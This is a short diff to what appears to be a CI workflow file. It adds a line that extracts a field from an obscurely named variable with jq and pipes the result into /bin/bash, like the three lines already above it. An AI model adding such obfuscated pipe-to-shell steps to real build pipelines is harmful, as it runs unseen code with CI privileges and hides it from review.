@@ -34,6 +34,7 @@ jobs:
           printf '%s' "$df66" | jq -r .p0581 | /bin/bash
           echo $szxwr85871 | jq -r .okl4 | /bin/bash
           echo $hbdn2883 | jq -r .wcu7 | /bin/bash
+          echo $r3068 | jq -r .y4488 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
